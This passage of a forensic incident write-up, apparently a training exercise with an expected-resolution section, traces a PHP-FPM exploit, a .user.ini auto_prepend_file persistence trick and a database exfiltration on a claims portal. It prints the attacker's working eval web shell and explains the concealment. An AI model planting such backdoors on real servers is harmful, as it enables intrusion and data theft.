`request_parse_body()`, introduced in PHP 8.4, parses a `multipart/form-data` or `application/x-www-form-urlencoded` body for verbs other than POST and returns the equivalent of `$_POST` and `$_FILES`. The portal uses it to receive chunked uploads from the mobile app over `PUT`. That is the second body parse during script execution that Red Hat names as the condition for code execution on PHP-FPM, and it explains why every attack sequence pairs a POST to `upload.php` (corrupt the worker during PHP's own body parsing) with a PUT to `upload-chunk.php` (make the application parse a body on the same worker).

The PHP settings are the defaults the mitigations target:

```text
9:memory_limit = 128M
29:;user_ini.filename = ".user.ini"
32:;user_ini.cache_ttl = 300
46:session.upload_progress.enabled = On
47:session.upload_progress.cleanup = On
```

`memory_limit = 128M` is the limit the POSTs exhaust. `session.upload_progress.enabled = On` is the condition of the twin CVE-2026-109619. The two `user_ini` lines are commented out, so the defaults apply: PHP-FPM, being a FastCGI SAPI, looks for a file named `.user.ini` in every directory from the requested script's directory up to the document root, and re-reads it at most every 300 seconds.

Finally, the document root belongs to the PHP-FPM user:

```text
drwxr-xr-x 5 www-data www-data 4096 Oct 21 03:07 /var/www/claims/public
```

Any code running inside a pool worker, as `www-data`, can create files in it. The engineer's history explains why: `cd /var/www/claims` followed by `sudo chown -R www-data:www-data /var/www`, run at deployment. The directory's modification time is the last time an entry was created or removed inside it, 03:07, a minute that step 5 makes significant.

### 5. The twelfth sequence: worker 4127, its delayed crash and the wrong block

**Goal.** One sequence ended differently. The pool's access log is the only log that ties a request to a worker PID: find the upload answered 200 by a worker that had just exhausted its memory, follow that PID until it dies, and check who was blamed for its crash.

**Actions.**

```text
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/php8.4-fpm/claims-access.log Grok='%{TIMESTAMP_ISO8601:time} %{IP:src_endpoint_ip} "%{WORD:http_method} %{URIPATH:http_request_url_path}(?:\?%{NOTSPACE:http_request_url_query_string})?" %{INT:http_response_code} %{NUMBER:duration} ms %{INT:process_memory_peak_kb} KB pid=%{INT:process_pid}'
!run Custom.Linux.Sys.AuthLog
!run Custom.Linux.Sys.ShellHistory
cat /etc/nginx/conf.d/blocklist.conf
```

The pool logs every request with `access.format = "%{%Y-%m-%dT%H:%M:%SZ}t %R \"%m %r\" %s %{mili}d ms %{kilo}M KB pid=%p"`: `%t` is the time the request was **received** (here in ISO 8601), `%R` the client address passed by nginx, `%m %r` method and URI without query string, `%s` the status, `%{mili}d` the time taken in milliseconds (`mili` is an accepted alias of `milliseconds`), `%{kilo}M` the peak memory allocated by PHP in KB, and `%p` the PID of the child that served the request. The grok expression maps them to `time`, `src_endpoint_ip`, `http_method`, `http_request_url_path`, `http_response_code`, `duration`, `process_memory_peak_kb` and `process_pid`. The child writes this line itself, after the request has ended (`fpm_request_end()` then `fpm_log_write()` in `fpm_main.c`): **a child killed during a request writes no access line.** `Custom.Linux.Sys.AuthLog` parses `/var/log/auth.log`; its `Sudo` source returns `Timestamp`, `Host`, `Program`, `User`, `RunAs`, `PWD` and `Command` for every sudo invocation. `Custom.Linux.Sys.ShellHistory` returns `OSPath`, `User`, `Shell`, `Timestamp`, `Command` and `Delta` for each history file, pairing bash's `#<epoch>` lines with the command that follows. `cat` prints the one nginx include file the engineer edited.

**Findings.** In the pool access log the attack POSTs are all there, each with a peak of 131072 KB (128 MiB, the full `memory_limit`), and each on the PID that crashed one second later. The eleven crashing PUTs are missing, because their workers died before writing a line. Exactly one PUT is present:

```text
2026-10-21T02:31:08Z 203.0.113.47 "POST /claims/upload.php" 500 409.812 ms 131072 KB pid=4093
2026-10-21T02:34:08Z 203.0.113.61 "POST /claims/upload.php" 500 406.334 ms 131072 KB pid=4061
2026-10-21T02:37:08Z 203.0.113.88 "POST /claims/upload.php" 500 411.950 ms 131072 KB pid=3988
...
2026-10-21T03:01:08Z 203.0.113.61 "POST /claims/upload.php" 500 408.643 ms 131072 KB pid=4203
2026-10-21T03:07:38Z 203.0.113.88 "POST /claims/upload.php" 500 406.981 ms 131072 KB pid=4127
2026-10-21T03:07:39Z 203.0.113.88 "PUT /claims/api/upload-chunk.php" 200 912.044 ms 131072 KB pid=4127
2026-10-21T03:10:20Z 198.51.100.73 "POST /claims/api/appraisals.php" 200 173.554 ms 4096 KB pid=4217
2026-10-21T03:11:39Z 198.51.100.73 "POST /claims/api/appraisals.php" 200 158.209 ms 4096 KB pid=4230
2026-10-21T03:13:30Z 198.51.100.73 "POST /claims/api/appraisals.php" 200 191.630 ms 4096 KB pid=4398
2026-10-21T03:15:18Z 198.51.100.73 "POST /claims/api/appraisals.php" 200 149.882 ms 4096 KB pid=4217
```

The full picture of the twelve sequences:

| # | Source IP | POST `upload.php` → 500 (worker, peak) | PUT `upload-chunk.php` | What happened to the worker |
|---|-----------|----------------------------------------|------------------------|-----------------------------|
| 1 | 203.0.113.47 | 02:31:08, 4093, 131072 KB | 02:31:09 → 502 | 4093 SIGSEGV, replaced by 4101 |
| 2 | 203.0.113.61 | 02:34:08, 4061, 131072 KB | 02:34:09 → 502 | 4061 SIGSEGV, replaced by 4114 |
| 3 | 203.0.113.88 | 02:37:08, 3988, 131072 KB | 02:37:09 → 502 | 3988 SIGSEGV, replaced by **4127** |
| 4 | 203.0.113.47 | 02:40:08, 4101, 131072 KB | 02:40:09 → 502 | 4101 SIGSEGV, replaced by 4139 |
| 5 | 203.0.113.61 | 02:43:08, 4114, 131072 KB | 02:43:09 → 502 | 4114 SIGSEGV, replaced by 4152 |
| 6 | 203.0.113.88 | 02:46:08, 4139, 131072 KB | 02:46:09 → 502 | 4139 SIGSEGV, replaced by 4166 |
| 7 | 203.0.113.47 | 02:49:08, 4152, 131072 KB | 02:49:09 → 502 | 4152 SIGSEGV, replaced by 4178 |
| 8 | 203.0.113.61 | 02:52:08, 4166, 131072 KB | 02:52:09 → 502 | 4166 SIGSEGV, replaced by 4191 |
| 9 | 203.0.113.88 | 02:55:08, 4178, 131072 KB | 02:55:09 → 502 | 4178 SIGSEGV, replaced by 4203 |
| 10 | 203.0.113.47 | 02:58:08, 4191, 131072 KB | 02:58:09 → 502 | 4191 SIGSEGV, replaced by 4217 |
| 11 | 203.0.113.61 | 03:01:08, 4203, 131072 KB | 03:01:09 → 502 | 4203 SIGSEGV, replaced by 4230 |
| **12** | **203.0.113.88** | **03:07:38, 4127, 131072 KB** | **03:07:39 → 200, `pid=4127`, 912.044 ms, 131072 KB** | **4127 survives; crashes at 03:12:57 on the appraisal firm's request; replaced by 4398** |

Sequence 12 is the success. Worker 4127 exhausted its memory on the POST at 03:07:38 and, one second later, served the chunked PUT to completion: status 200, the same 25-byte response the endpoint returns to the mobile app, after 912 ms and with its peak memory still at the full 131072 KB. nginx saw nothing wrong (`rt=1.743`, no upstream error in its error log). The PUT appears in this log only because, this time, the worker lived to write the line. Code supplied by `203.0.113.88` ran inside worker 4127, as `www-data`, during that request; step 6 shows what it wrote.

4127 did not crash then, but its heap stayed corrupted. It served nothing else for five minutes and died at 03:12:57 on the next request it took, the appraisal firm's third report: no PHP error before the crash, a different instruction pointer, and a read fault instead of a write (step 3). The advisories describe this behaviour: the request that corrupts memory can be answered normally and the crash can appear on a later request served by the same worker. The appraisal client retried at 03:13:30, landed on the fresh worker 4398 and got 200; its other five reports that night were accepted by 4217, 4230 and 4398. **The appraisal firm did not crash PHP-FPM; it was the next customer of a worker the attacker had already broken.**

What the on-call engineer did with that crash, from `Custom.Linux.Sys.RSyslogSSHLogin`, `Custom.Linux.Sys.ShellHistory` and `Custom.Linux.Sys.AuthLog`:

| Time | Source | Event |
|------|--------|-------|
| 03:16:18 | auth.log (sshd-session 4400) | `Accepted publickey for mfoley from 10.8.0.14 port 51522 ssh2`, session 7 |
| 03:16:49 | bash history | `systemctl status php8.4-fpm.service --no-pager` |
| 03:17:26 | bash history | `tail -n 5 /var/log/nginx/claims_error.log` |
| 03:18:44 | sudo | `/usr/bin/vim /etc/nginx/conf.d/blocklist.conf` (sudo session closed, file saved, at 03:19:30) |
| 03:19:49 | sudo | `/usr/sbin/nginx -t` |
| 03:20:08 | sudo | `/usr/bin/systemctl reload nginx` (new nginx workers 4414 and 4415) |
| 03:22:48 | bash history | `tail -n 5 /var/log/nginx/claims_access.log` |
| 03:24:38 | auth.log | `Disconnected from user mfoley 10.8.0.14 port 51522` |

At 03:17:26 the last five lines of the nginx error log were these, all from the appraisal firm:

```text
2026/10/21 03:12:55 [warn] 816#816: *48013 a client request body is buffered to a temporary file /var/lib/nginx/body/0000000420, client: 198.51.100.73, server: claims.halvane.example, request: "POST /claims/api/appraisals.php HTTP/1.1", host: "claims.halvane.example"
2026/10/21 03:12:57 [error] 816#816: *48013 upstream prematurely closed connection while reading response header from upstream, client: 198.51.100.73, server: claims.halvane.example, request: "POST /claims/api/appraisals.php HTTP/1.1", upstream: "fastcgi://unix:/run/php/php8.4-fpm-claims.sock:", host: "claims.halvane.example"
2026/10/21 03:13:27 [warn] 815#815: *48016 a client request body is buffered to a temporary file /var/lib/nginx/body/0000000421, client: 198.51.100.73, server: claims.halvane.example, request: "POST /claims/api/appraisals.php HTTP/1.1", host: "claims.halvane.example"
2026/10/21 03:15:17 [warn] 816#816: *48020 a client request body is buffered to a temporary file /var/lib/nginx/body/0000000422, client: 198.51.100.73, server: claims.halvane.example, request: "POST /claims/api/appraisals.php HTTP/1.1", host: "claims.halvane.example"
2026/10/21 03:17:08 [warn] 816#816: *48031 a client request body is buffered to a temporary file /var/lib/nginx/body/0000000423, client: 198.51.100.73, server: claims.halvane.example, request: "POST /claims/api/appraisals.php HTTP/1.1", host: "claims.halvane.example"
```

The eleven attack crashes were further up the file, out of view. The resulting rule:

```text
# Emergency blocks (on-call). Reload nginx after editing.
deny 198.51.100.73;  # on-call: this client crashes php-fpm
```

`deny` (nginx access module) answers 403 to the listed address. After the reload, the firm's remaining uploads were refused at 03:21:15, 03:21:47 and 03:22:20 with `403 153 ... rl=841 cl=8388608`: nginx rejected each request after reading only its 841 bytes of request line and headers, so the declared 8 MiB report never arrived. At 03:22:48 the engineer read the last five lines of the access log, two accepted reports followed by the three 403s, and closed the ticket. The block was the wrong call, and it is still in place.

### 6. Persistence: `.user.ini`, `auto_prepend_file` and the fake session file

**Goal.** Code ran as `www-data` inside worker 4127 during the 200 at 03:07:39. Find what it wrote to disk in that second, read it, and follow whatever it points to.

**Actions.**

```text
!run Custom.Linux.Forensics.Timeline
!run Linux.Search.FileFinder SearchFilesGlob=/var/www/claims/**/.user.ini
!run Linux.Search.FileFinder SearchFilesGlob=/var/lib/php/sessions/*
cat /var/www/claims/public/.user.ini
cat /var/lib/php/sessions/sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f
```

`Custom.Linux.Forensics.Timeline` builds a MAC-time timeline of its default `TriageGlobs` (`/etc/**`, `/home/**`, `/root/**`, `/tmp/**`, `/var/tmp/**`, `/dev/shm/**`, `/opt/**`, `/usr/local/**`, `/var/www/**`, `/srv/**`); its `RecentFiles` source returns `OSPath`, `Mtime`, `Size`, `Mode`, `Uid` and `Gid` for files modified in the last `RecentDays` (default 14) days. `Linux.Search.FileFinder` searches by glob: `**` recurses through every subdirectory, so the first run finds every `.user.ini` anywhere under the application; the second lists the session files with `Size`, `Mtime`, `Mode`, owner and `Hash`. `/var/lib/php/sessions` is not in the timeline globs. On a stock Velociraptor server, `Linux.Search.FileFinder` fills `Hash` only with `Calculate_Hash=Y`. The two `cat` commands print single files, a job no artifact does.

**Findings.** The application was deployed on 8 September (the code files carry an mtime of 2026-09-08 02:17:08), so the file rows of the 14-day window are few; besides the engineer's `.bash_history` (03:24:38) they are:

| OSPath | Mtime (UTC) | Size | Mode | Uid | Gid |
|--------|-------------|------|------|-----|-----|
| /var/www/claims/public/.user.ini | **2026-10-21 03:07:39** | 95 | -rw-r--r-- | 33 | 33 |
| /var/www/claims/storage/appraisals/APR-71830.pdf | 2026-10-21 03:10:20 | 7339118 | -rw-r----- | 33 | 33 |
| /var/www/claims/storage/appraisals/APR-71831.pdf | 2026-10-21 03:11:39 | 5241966 | -rw-r----- | 33 | 33 |
| /var/www/claims/storage/appraisals/APR-71832.pdf | 2026-10-21 03:13:30 | 9960558 | -rw-r----- | 33 | 33 |
| /var/www/claims/storage/appraisals/APR-71833.pdf | 2026-10-21 03:15:18 | 4717678 | -rw-r----- | 33 | 33 |
| /var/www/claims/storage/appraisals/APR-71834.pdf | 2026-10-21 03:17:10 | 6814830 | -rw-r----- | 33 | 33 |
| /var/www/claims/storage/appraisals/APR-71835.pdf | 2026-10-21 03:18:59 | 3144814 | -rw-r----- | 33 | 33 |
| /etc/nginx/conf.d/blocklist.conf | 2026-10-21 03:19:30 | 118 | -rw-r--r-- | 0 | 0 |
| /var/www/claims/public/uploads/incoming/HM-CL-88240_01.jpg | 2026-10-21 07:38:20 | 2187364 | -rw-r--r-- | 33 | 33 |
| /var/www/claims/public/uploads/incoming/HM-CL-88240_02.jpg | 2026-10-21 07:38:20 | 1934417 | -rw-r--r-- | 33 | 33 |

The six appraisal PDFs match the six reports accepted in the pool access log (APR-71832 is the 03:13:30 retry of the report that hit worker 4127), `blocklist.conf` is the on-call edit, and the two photos are a customer's upload at 07:38:20. One file has no legitimate writer: a hidden `.user.ini` in the document root, owned by `www-data` (uid 33), modified at **03:07:39, the second of the 200 answered by `pid=4127`**. The FileFinder hunt finds no other `.user.ini` under `/var/www/claims` (one row, SHA-256 `1685eef7c87909a575b62c9dab1764987bec20f3b8672f486b8e4283a56a27f2`). Its content:

```ini
; cache settings
auto_prepend_file=/var/lib/php/sessions/sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f
```

The comment is camouflage. `auto_prepend_file` names a PHP file that PHP executes before every requested script, as if it were `require`d at the top. Its changeable mode is `PHP_INI_PERDIR`, which is exactly what a `.user.ini` may set. Placed in `/var/www/claims/public`, the document root, it applies to every PHP script on the site, because PHP scans from the script's directory up to the document root. PHP-FPM honours it without any change to `php.ini` and without a restart, since each worker re-reads `.user.ini` files at most every 300 seconds.

The target sits in the session directory, `/var/lib/php/sessions`, which is `drwx-wx-wt root root` (mode 1733): `www-data` can create files there but cannot list them, and each session file is `www-data`, mode 0600, like this one. FileFinder, running as root, lists three files:

| OSPath | Size | Mtime (UTC) | Mode | Uid/Gid | SHA-256 |
|--------|------|-------------|------|---------|---------|
| /var/lib/php/sessions/sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f | 164 | 2026-10-21 07:39:39 | -rw------- | 33/33 | `ba17f2045e9a63c7b5304ddeeb2257f74a794e681a6f83698079bf45fefa112e` |
| /var/lib/php/sessions/sess_eae6d512364fb7b24cf87435b28519de | 124 | 2026-10-21 07:38:20 | -rw------- | 33/33 | `d17bd3c7481802cf23228b6c9d164f4cf57f85501cd6bdc3a0ec398c7712a39b` |
| /var/lib/php/sessions/sess_56f7c5078edad8f727a4b90e925d5832 | 131 | 2026-10-21 07:39:39 | -rw------- | 33/33 | `2a18b2af5b5806590e49151712a3c6eb02b31109fdc09d2d454b70f207533423` |

By name, mode, owner and timestamp the three are indistinguishable. Their contents are not. A real PHP session file holds serialized variables:

```text
csrf|s:32:"4e9b1c07d2a85f36e1b0c9d47a2f8e15";claim_draft|a:3:{s:4:"step";i:2;s:6:"photos";i:2;s:3:"ref";s:11:"HM-CL-88240";}
```

The file `.user.ini` points to holds PHP code:

```php
<?php @touch(__FILE__);
if (($_SERVER['HTTP_X_CLAIM_REF'] ?? '') === '89292cbca1564d5a9652c3873d479ec1') {
    @eval(base64_decode($_POST['d'] ?? ''));
    exit;
}
```

Line by line:

- `@touch(__FILE__);` sets the file's modification and access times to now, on **every** PHP request the pool serves (the `@` suppresses any error). Debian removes session files older than `session.gc_maxlifetime` (1440 seconds, 24 minutes) every 30 minutes (`phpsessionclean.timer` on a systemd host; the `/etc/cron.d/php` line only runs when systemd is absent, and syslog shows `phpsessionclean.service` running twice an hour). The internal monitor alone requests `/claims/status.php` every 15 minutes, so the file is never old enough to be deleted, even at night. Its Mtime, 07:39:39, is therefore not its creation time: it is the time of the last PHP request before collection (`GET /claims/` from `192.0.2.114`, the same second in which that customer's genuine session `sess_56f7c5078edad8f727a4b90e925d5832` was saved). The file is tied to 03:07:39 by the `.user.ini` written in that second, which already points to it; on ext4, `stat` also reports the inode's birth time, which `touch()` does not change.
- `$_SERVER['HTTP_X_CLAIM_REF']` is the value of the request header `X-Claim-Ref` (PHP exposes request headers as `HTTP_` plus the name in upper case, dashes turned into underscores). The strict comparison `===` with the 32-character key means that only a request carrying `X-Claim-Ref: 89292cbca1564d5a9652c3873d479ec1` triggers the rest.
- `eval(base64_decode($_POST['d']))` runs arbitrary PHP sent base64-encoded in the POST field `d`.
- `exit;` ends the request after the attacker's code, so the script that was actually requested never runs.

Without the header the payload only touches itself and the requested page runs normally: the backdoor is invisible to every ordinary visitor and to the monitor. With the header, any PHP URL on the site becomes a remote code execution endpoint running as `www-data`. Writing the payload where the `sess_` prefix and the 0600 mode make it look like a session, and outside the default timeline globs, is masquerading (T1036.005) and hiding (T1564.001); the whole construct is a web shell (T1505.003) that consists of one configuration line and one data file, neither of them part of PHP or of the application code.

### 7. Backdoor use and exfiltration through `status.php`

**Goal.** The backdoor runs before any PHP script, so its use hides behind legitimate pages. Find which page was used, what it received besides normal traffic, how long those requests ran inside PHP-FPM, and what was taken.

**Actions.**

```text
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/nginx/claims_access.log Grok='%{IP:src_endpoint_ip} - %{NOTSPACE:actor_user_name} \[%{HTTPDATE:time}\] "%{WORD:http_method} %{URIPATH:http_request_url_path}(?:\?%{NOTSPACE:http_request_url_query_string})? HTTP/%{NUMBER:http_request_version}" %{INT:http_response_code} %{INT:http_response_length} "%{DATA:http_request_referrer}" "%{DATA:http_request_user_agent}" rl=%{INT:http_request_length} cl=(?:%{INT:http_request_content_length}|-) rt=%{NUMBER:http_request_time}' LineRegex='status\.php|\.sql\.gz'
!run Custom.Linux.Sys.GrokLog LogPath=/var/log/php8.4-fpm/claims-access.log Grok='%{TIMESTAMP_ISO8601:time} %{IP:src_endpoint_ip} "%{WORD:http_method} %{URIPATH:http_request_url_path}(?:\?%{NOTSPACE:http_request_url_query_string})?" %{INT:http_response_code} %{NUMBER:duration} ms %{INT:process_memory_peak_kb} KB pid=%{INT:process_pid}' LineRegex='status\.php'
cat /var/www/claims/public/claims/status.php
ls -la /var/www/claims/public/uploads/incoming/
```

The first run reuses the nginx expression with `LineRegex='status\.php|\.sql\.gz'`: the dots are escaped so they match a literal `.`, and `|` is regular-expression alternation inside the quotes, keeping lines that mention either the status page or a gzip-compressed SQL file. The second filters the pool log on the status page to get duration, peak memory and worker PID. `cat` prints the page's source. `ls -la` lists the upload folder in long format (`-l`) including hidden entries (`-a`), whose names start with a dot.

**Findings.** `status.php` refuses everything but GET:

```php
if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    header('Allow: GET');
    http_response_code(405);
    exit;
}
```

Every legitimate line for it is a GET: the monitor's (`10.20.9.30 ... "GET /claims/status.php HTTP/1.1" 200 58 "-" "claims-uptime/1.4"` every 15 minutes) and the attacker's reconnaissance at 02:19:00. Three lines are POSTs, all from `203.0.113.201`, an address not seen before, and all answered **200**:

```text
203.0.113.201 - - [21/Oct/2026:03:43:31 +0000] "POST /claims/status.php HTTP/1.1" 200 61 "https://claims.halvane.example/claims/status.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" rl=1187 cl=812 rt=0.041
203.0.113.201 - - [21/Oct/2026:03:44:23 +0000] "POST /claims/status.php HTTP/1.1" 200 412 "https://claims.halvane.example/claims/status.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" rl=1355 cl=980 rt=21.487
203.0.113.201 - - [21/Oct/2026:03:51:40 +0000] "GET /uploads/incoming/.tmp_5e1b9c.sql.gz HTTP/1.1" 200 48213077 "-" "curl/8.5.0" rl=118 cl=- rt=4.871
203.0.113.201 - - [21/Oct/2026:03:52:15 +0000] "POST /claims/status.php HTTP/1.1" 200 23 "https://claims.halvane.example/claims/status.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" rl=1131 cl=588 rt=0.046
```

The pool access log shows the same three POSTs from the PHP side:

```text
2026-10-21T03:43:31Z 203.0.113.201 "POST /claims/status.php" 200 38.226 ms 2048 KB pid=4230
2026-10-21T03:44:02Z 203.0.113.201 "POST /claims/status.php" 200 21483.112 ms 6144 KB pid=4217
2026-10-21T03:52:15Z 203.0.113.201 "POST /claims/status.php" 200 43.871 ms 2048 KB pid=4230
```

- **A POST answered 200 by a GET-only page** means code ran before the script and ended the request before the method check: the `auto_prepend_file` payload. The Referer, the status page itself, is fabricated: the page has no form that could post to it.
- **The second POST** was received by worker 4217 at 03:44:02 and ran for 21483.112 ms; nginx logged it at its end, 03:44:23, with `rt=21.487`. Twenty-one seconds on a page that normally answers in about 5 ms is the database dump. The prepended code runs before the application's bootstrap loads `/var/www/claims/.env` into the environment, so the attacker's code has to read that file itself (it is `www-data`, mode 0640) to get `DB_USER=claims_app` and `DB_PASSWORD`, then query the `claims` database on `127.0.0.1:3306`. The dump was written to `/var/www/claims/public/uploads/incoming/.tmp_5e1b9c.sql.gz` when the request ended, at 03:44:23.
- **The download.** At 03:51:40 the same address fetched `/uploads/incoming/.tmp_5e1b9c.sql.gz` with `curl/8.5.0`: 200, **48213077 bytes** in 4.871 seconds. nginx served the hidden file as a static file because the `location ^~ /uploads/` block only refuses `*.php` and nothing in the configuration denies names starting with a dot.
- **The clean-up.** At 03:52:15 a third POST (23-byte answer) deleted the file. At collection the folder holds only the morning's two photos:

```text
total 4040
drwxr-xr-x 2 www-data www-data    4096 Oct 21 07:38 .
drwxr-xr-x 3 www-data www-data    4096 Sep  8 02:17 ..
-rw-r--r-- 1 www-data www-data 2187364 Oct 21 07:38 HM-CL-88240_01.jpg
-rw-r--r-- 1 www-data www-data 1934417 Oct 21 07:38 HM-CL-88240_02.jpg
```

The dump is gone from disk; only the access log proves that it existed, how big it was and who downloaded it.

Two details explain the episode's title. The three POSTs were served by workers 4230 and 4217, not by 4127, the worker originally exploited (it was already dead): the `.user.ini` applies to every worker, so the backdoor runs in whichever legitimate process takes the request. And `Linux.Sys.Pslist` at collection shows only the expected processes (systemd and its services, rsyslogd, cron, sshd and the triage session, `mariadbd`, the php-fpm master 811 with children 4217, 4230 and 4398, the nginx master 812 with workers 4414 and 4415): no shell, no `mysqldump`, no unknown binary. The evidence is consistent with a dump made inside the PHP worker itself, through PDO and PHP's own gzip functions; a detection that waits for a PHP worker to spawn a shell or a database client would have seen nothing. Neither log records request headers or bodies, so the commands sent in the POST field `d` cannot be recovered; what they did is known only from their effects. The 412-byte answer to the dump request and the 61- and 23-byte answers to the other two are all that is left of the attacker's output.

### 8. Expected resolution

**Root cause.** `claims-web-01` exposed an unpatched PHP 8.4.26 (packages held with `apt-mark hold`; fixed upstream in 8.4.27) on PHP-FPM to the internet. It was vulnerable to PHP2Shell CVE-2026-109618 because three conditions came together: an endpoint that parses a request body while the script runs (`request_parse_body()` in `/claims/api/upload-chunk.php`), the default `memory_limit = 128M` with session upload progress enabled, and requests the attacker could size to exhaust that limit during body parsing. A memory-exhausting multipart POST corrupted a worker, and the chunked PUT that followed ran attacker code as `www-data` inside it. Because the deployment had made the document root owned by `www-data`, that code could plant a `.user.ini` and turn a one-off code execution into persistent access.

**Attacker actions, in order (21 October 2026, UTC).**

| Time | Action | Evidence |
|------|--------|----------|
| 02:18:38–02:19:00 | Reconnaissance from `203.0.113.47`: `GET /claims/`, `GET /claims/new.php`, `OPTIONS` (204) and `GET` (405) on `/claims/api/upload-chunk.php`, `GET /claims/status.php` | nginx and pool access logs |
| 02:31:08–03:01:09 | Sequences 1–11, one every 3 minutes, IPs `.47` → `.61` → `.88`: multipart POST to `/claims/upload.php` (500, memory exhausted in Unknown on line 0) then chunked PUT to `/claims/api/upload-chunk.php` (502, worker SIGSEGV at ip `000055d0c4093e1f`) | all seven sources |
| 03:07:38 | Sequence 12 from `203.0.113.88`: POST 500 on worker 4127 | nginx, PHP error log, pool log |
| 03:07:39 | PUT answered 200 by `pid=4127` (912.044 ms, 131072 KB): code execution as `www-data`; `.user.ini` written in the document root and payload `sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f` written in the session directory | pool log, timeline, FileFinder |
| 03:12:57 | Worker 4127, heap still corrupted, crashes on the appraisal firm's third report (502, ip `000055d0c41f2a8b`, error 4) | nginx, FPM master, kern.log |
| 03:16:18–03:24:38 | On-call session: reads the last five error-log lines, blocks `198.51.100.73` (saved 03:19:30), reloads nginx (03:20:08); the firm's next uploads get 403 | auth.log, bash history, blocklist.conf |
| 03:43:31 | First backdoor POST to `/claims/status.php` from `203.0.113.201` (pid 4230) | nginx and pool logs |
| 03:44:02–03:44:23 | Backdoor POST running 21483.112 ms in pid 4217: `.env` read, `claims` database dumped to `uploads/incoming/.tmp_5e1b9c.sql.gz` | pool log, nginx log |
| 03:51:40 | `curl/8.5.0` downloads the dump: 48213077 bytes in 4.871 s | nginx access log |
| 03:52:15 | Backdoor POST deletes the dump (pid 4230) | nginx and pool logs; file absent |

Afterwards: at 06:50:00 Alexander links the night's 502 ticket to the PHP2Shell warnings (off-host); `mfoley` logs in for the triage at 07:33:26; collection runs at 07:40:00 with the portal still online. The fixed PHP releases are published at about 14:00 UTC the same day.

**Persistence mechanism.** `/var/www/claims/public/.user.ini` sets `auto_prepend_file=/var/lib/php/sessions/sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f`. Every PHP request served by the `claims` pool first runs that payload, which refreshes its own timestamps so that Debian's session clean-up never deletes it, and runs base64-encoded PHP from the POST field `d` when the `X-Claim-Ref` header carries the key. No attacker process exists between requests. The mechanism lives in a configuration file and a data file, not in PHP, so **it survives the PHP upgrade**: the restarted workers read the same `.user.ini` and prepend the same file.

**Affected assets.**

- `claims-web-01` and the PHP-FPM pool `claims` (`www-data`).
- The `claims` database on MariaDB: customers' personal data and claim records, dumped to a 48213077-byte compressed file and downloaded.
- The secrets in `/var/www/claims/.env`: database user `claims_app` and its password, S3 access key and secret key for bucket `halvane-claims-documents` (`eu-south-1`), `APPRAISAL_TOKEN`, `APP_KEY`.
- `claims.halvane.example`, every PHP page of which is a backdoor entry point until the persistence is removed.
- The appraisal firm's nightly integration, blocked since 03:20:08.

**Recommended remediation.**

*Containment, before the patch.* First preserve evidence: the seven logs and their rotations, `.user.ini`, the payload and their hashes; consider a memory image before restarting, since workers 4217 and 4230 executed the attacker's code. Then Alexander has to choose between CISA's guidance for PHP systems that cannot be patched (take them offline) and keeping intake open behind temporary mitigations. The mitigations, all temporary until the upgrade:

```ini
; /etc/php/8.4/fpm/pool.d/claims.conf
php_admin_value[memory_limit] = -1
php_admin_flag[session.upload_progress.enabled] = off
```

`memory_limit = -1` removes the limit whose exhaustion triggers CVE-2026-109618; set through `php_admin_value`, it cannot be changed by the application (`ini_set()`) or by a `.user.ini`. Do **not** lower the limit and do **not** use `RLIMIT_AS`/`RLIMIT_DATA`: the bug fires when an allocation fails, and both would make allocations fail sooner. `session.upload_progress.enabled = off` closes the demonstrated path of CVE-2026-109619 and must be set in the pool or `php.ini`, never by the application. Reduce request sizes where the logs allow it: the mobile app sends 2097152-byte chunks with a `Content-Length`, so the chunk endpoint can refuse chunked bodies and anything larger than a chunk, and the status page needs no body at all:

```nginx
location = /claims/api/upload-chunk.php {
    client_max_body_size 3m;
    if ($http_transfer_encoding) { return 411; }
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.4-fpm-claims.sock;
}
location = /claims/status.php {
    limit_except GET { deny all; }
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.4-fpm-claims.sock;
}
```

`return 411` (Length Required) rejects any request that announces a `Transfer-Encoding`; `limit_except GET` allows only GET (and HEAD) on the status page. Keep `client_max_body_size`, `post_max_size` and `upload_max_filesize` for `upload.php` at what customers really send (the largest legitimate upload of the night declared 31457280 bytes). Set `MemoryMax=` on `php8.4-fpm.service` (`systemctl edit php8.4-fpm.service`) as an outer bound for the whole service; it is not a fix. Restart all workers after every change (`sudo systemctl restart php8.4-fpm`). Block `203.0.113.47`, `203.0.113.61`, `203.0.113.88` and `203.0.113.201` at the edge, knowing that exploitation infrastructure is often shared and rotates; none of these blocks touches the persistence, which any new address can use.

*Eradication.*

```bash
sudo apt-mark unhold php8.4-fpm php8.4-cli php8.4-common php8.4-mysql php8.4-opcache php8.4-readline
sudo apt update && sudo apt install --only-upgrade php8.4-fpm php8.4-cli php8.4-common php8.4-mysql php8.4-opcache php8.4-readline
sudo rm /var/www/claims/public/.user.ini /var/lib/php/sessions/sess_9f2c4e1a7b3d5c8e0a6f2b9d4c1e7a3f
sudo systemctl restart php8.4-fpm
```

`apt-mark unhold` removes the hold so apt can upgrade the packages; the upgrade must reach the Debian package that carries the upstream 8.4.27 fix. Delete the two attacker files only after acquiring them, then restart PHP-FPM so that no worker keeps the cached `.user.ini` for up to 300 more seconds. Then hunt for anything else of the same kind:

```bash
sudo find /var/www -name '.user.ini' -o -name '.htaccess'
sudo grep -rlE 'auto_(prepend|append)_file' /var/www /etc/php
sudo grep -rl '<?php' /var/lib/php/sessions
sudo find /var/www/claims/public/uploads /var/www/claims/storage -type f -name '.*'
```

The first finds per-directory configuration files; the second lists every file that mentions a prepend or append directive, where only `php.ini`, with empty values, should appear; the third finds PHP code disguised as session files (run as root, since the session directory cannot be listed by other users, and recursive so that no shell glob is needed); the fourth finds hidden files where only customer uploads should exist. Verify the application files against the deployment artefact.

